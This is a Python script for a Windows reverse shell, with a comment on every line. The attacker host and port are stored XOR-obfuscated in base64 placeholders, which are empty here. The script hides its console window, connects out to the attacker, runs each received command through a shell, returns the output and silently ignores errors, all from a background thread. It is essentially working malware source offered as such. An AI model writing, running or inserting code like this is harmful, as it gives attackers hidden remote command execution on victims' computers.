import socket  # Imports socket for network communication
import subprocess  # Imports subprocess to run shell commands
import threading  # Imports threading to run reverse shell in background
import base64  # Imports base64 for decoding encrypted data
import ctypes  # Imports ctypes to interact with Windows DLLs
import os  # Imports os (unused in code)
import sys  # Imports sys (unused in code)

KEY = b"x" * 32  # Defines 32-byte XOR key using 'x'
ENCRYPTED_HOST = base64.b64decode(" ")  # Placeholder: base64-decodes encrypted host (empty)
ENCRYPTED_PORT = base64.b64decode(" ")  # Placeholder: base64-decodes encrypted port (empty)

# === FUNCTION TO DECRYPT THE XOR DATA ===
def xor_decrypt(data, key):  # Defines function to decrypt XOR-encrypted bytes
    return bytes(a ^ b for a, b in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))  # Repeats key and XORs with data

HOST = xor_decrypt(ENCRYPTED_HOST, KEY).decode()  # Decrypts and decodes the attacker IP address
PORT = int(xor_decrypt(ENCRYPTED_PORT, KEY).decode())  # Decrypts and converts port to integer

user32 = ctypes.windll.user32  # Loads user32.dll for window control
kernel32 = ctypes.windll.kernel32  # Loads kernel32.dll for system functions
hwnd = kernel32.GetConsoleWindow()  # Gets handle to current console window
if hwnd != 0:  # Checks if console window exists
    user32.ShowWindow(hwnd, 0)  # Hides the console window

def reverse_shell():  # Defines reverse shell function
    try:  # Starts try block for error handling
        s = socket.socket()  # Creates a TCP socket
        s.connect((HOST, PORT))  # Connects to attacker (HOST, PORT)
        while True:  # Loops to receive and execute commands
            cmd = s.recv(1024).decode()  # Receives command (up to 1024 bytes) and decodes
            if cmd.lower() in ["exit", "quit"]:  # Checks for exit commands
                break  # Exits loop if 'exit' or 'quit'
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # Runs command in shell
            output = proc.stdout.read() + proc.stderr.read()  # Captures stdout and stderr
            s.send(output + b"\n")  # Sends output back to attacker
    except:  # Catches any exception
        pass  # Silently ignores errors

threading.Thread(target=reverse_shell, daemon=True).start()  # Starts reverse shell in background thread (daemon)

while True:  # Infinite loop to keep script alive
    ctypes.windll.kernel32.Sleep(1000)  # Sleeps 1 second to reduce CPU usage